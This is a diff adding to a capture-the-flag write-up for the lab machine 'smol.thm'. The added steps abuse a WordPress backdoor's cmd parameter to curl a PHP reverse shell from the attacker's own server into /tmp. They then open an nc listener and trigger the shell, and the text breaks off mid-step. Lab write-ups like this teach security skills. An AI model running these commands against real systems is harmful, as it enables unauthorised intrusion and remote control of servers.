@@ -107,6 +107,8 @@ http://www.smol.thm/wp-admin/edit.php?cmd=whoami
 And we should see:
 **IMAGE PLACEHOLDER**
 
+## Gaining a Foothold of the Machine - First Flag
+
 Great! Now we are this close to owning the machine, but wait! I know what you're thinking, you wanna go to revshells.com and plug a shell in there. Well, that's what I tried, but there must be some restriction on this backdoor since doing so results into nothing.
 
 We need to get a bit smarter amico mio, after trying some commands one caught my eye:
@@ -125,3 +127,29 @@ From the python server, I could see that the reverse shell file was blank (just 
 Let's find another directory, `/tmp/` should be a good guess. And it works!
 
 ![Reverse shells on /tmp](images/tmp.png)
+
+If you are wondering how I got the shell in there, here's a step by step guide:
+- Download the pentestmonkey script from the link above
+    - REMEMBER! you need to modify the ip and port field with your info or it won't work!
+- Open a python server on **your** machine in the directory with your script
+```bash
+python3 -m http.server 8000
+```
+- Download the script on the target machine:
+```text
+http://smol.thm/wp-admin/pages.php?cmd= curl -s http://[YOUR_IP]:8000/php-reverse-shell.php -o /tmp/rev.php
+```
+
+Now just activate a listener on your machine:
+```bash
+nc -nlvp 4444 # Or whatever port you put in the script
+```
+
+And now activate it!
+```text
+http://smol.thm/wp-admin/pages.php?cmd=php /tmp/rev.php
+```
+We're in!
+
+Now let's make our shell a little bit prettier by running:
+- 
